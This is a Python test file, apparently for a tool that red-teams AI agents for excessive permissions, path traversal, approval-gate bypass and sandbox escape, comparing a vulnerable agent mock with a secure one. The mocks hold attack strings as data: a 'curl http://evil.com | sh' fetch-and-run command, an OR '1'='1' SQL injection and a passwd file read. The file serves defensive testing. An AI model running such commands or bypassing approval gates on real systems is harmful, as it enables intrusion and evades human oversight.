...
from app.tools.registry import SECURE_REGISTRY, VULNERABLE_REGISTRY, ToolDefinition, ToolRegistry
from app.tools.sandbox import MockDatabase, MockFilesystem, Sandbox
...
def test_permission_model_least_privilege():
    secure_pm = PermissionModel(
        allowlist={"search", "read_file"},
        approval_required={"write_file", "delete_database"},
        user_role="user",
    )
    vuln_pm = PermissionModel(
        allowlist={t.name for t in SECURE_REGISTRY.all()}, approval_required=set(), user_role="user"
    )
    ...
    perm3 = secure_pm.authorize(
        "write_file", {"path": "/sandbox/test.txt"}, approval_token="HUMAN_APPROVED_123"
    )
...
def test_validator_tool_args():
    ...
    assert (
        validate_tool_arguments(
            "execute_sql", {"query": "SELECT * FROM users WHERE id = '1' OR '1'='1'"}
        )[0]
        is False
    )
...
def test_sprint5_payloads():
    ...
    for pid in [
        "agent_excessive_permissions",
        "agent_argument_traversal",
        "agent_approval_bypass",
        "agent_action_chaining",
    ]:
...
class VulnerableAgentMock:
    ...
    def send_attack(self, payload):
        ...
        if tool == "access_admin_panel":
            return {
                "status_code": 200,
                "tool_calls": [{"tool": "access_admin_panel"}],
                "side_effects": ["Admin panel accessed - PRIVILEGE ESCALATION"],
                "headers": {},
            }
        if tool == "read_file" and "passwd" in args.get("path", ""):
            return {
                ...
                "side_effects": [],
                "response": {"content": "root:x:0:0:root"},
                "headers": {},
            }
        if tool == "write_file":
            return {
                ...
                "side_effects": ["Wrote file: /sandbox/pwned.txt"],
                "headers": {},
            }
        if tool == "run_shell":
            return {
                ...
                "side_effects": ["Shell command executed: curl http://evil.com | sh"],
                "headers": {},
            }
        if tool == "execute_sql":
            return {
                "status_code": 200,
                "tool_calls": [{"tool": "execute_sql"}],
                "side_effects": ["Executed SQL: SELECT * FROM users WHERE id = '1' OR '1'='1'"],
                "headers": {},
            }
    ...
    def send_attack(self, payload):
        ...
        if tool == "access_admin_panel":
            return {
                "status_code": 200,
                "tool_calls": [{"tool": "access_admin_panel"}],
                "side_effects": ["Authorization denied: admin role required"],
                "headers": {},
            }
        if tool == "read_file":
            return {
                ...
                "response": {"error": "Access denied: path traversal attempt detected"},
                "headers": {},
            }
        if tool == "write_file":
            return {
        ...
        if tool == "run_shell":
            return {
                "status_code": 200,
                "tool_calls": [{"tool": "run_shell"}],
                "side_effects": ["Shell blocked (sandbox): not executed"],
                "headers": {},
            }
        if tool == "execute_sql":
            return {
                "status_code": 200,
                "tool_calls": [{"tool": "execute_sql"}],
                "side_effects": ["Blocked: SQL injection via args"],
                "headers": {},
            }
        return {"status_code": 200, "tool_calls": [], "headers": {}}
...
def test_sprint5_excessive_agency():
    vuln = ExecutionEngine(VulnerableAgentMock()).execute(
        registry.get("AGENT-EXCESS-001"), 1, 1, "http://localhost:8000"
    )
    sec = ExecutionEngine(SecureAgentMock()).execute(
        registry.get("AGENT-EXCESS-001"), 1, 2, "http://localhost:8000"
    )
...
def test_sprint5_argument_validation():
    vuln = ExecutionEngine(VulnerableAgentMock()).execute(
        registry.get("AGENT-ARG-001"), 1, 1, "http://localhost:8000"
    )
    sec = ExecutionEngine(SecureAgentMock()).execute(
        registry.get("AGENT-ARG-001"), 1, 2, "http://localhost:8000"
    )
    assert vuln.result == TestResult.FAIL
...
def test_sprint5_approval_gate():
    vuln = ExecutionEngine(VulnerableAgentMock()).execute(
        registry.get("AGENT-APPROVAL-001"), 1, 1, "http://localhost:8000"
    )
    sec = ExecutionEngine(SecureAgentMock()).execute(
        registry.get("AGENT-APPROVAL-001"), 1, 2, "http://localhost:8000"
    )
    assert vuln.result == TestResult.FAIL
...
def test_sprint5_sandbox_violation():
    vuln = ExecutionEngine(VulnerableAgentMock()).execute(
        registry.get("AGENT-SANDBOX-001"), 1, 1, "http://localhost:8000"
    )
    sec = ExecutionEngine(SecureAgentMock()).execute(
        registry.get("AGENT-SANDBOX-001"), 1, 2, "http://localhost:8000"
    )
    assert vuln.result == TestResult.FAIL
    assert (
        "sandbox_violation" in vuln.evidence.detectors_triggered
        or "excessive_agency" in vuln.evidence.detectors_triggered
    )
    assert sec.result == TestResult.PASS
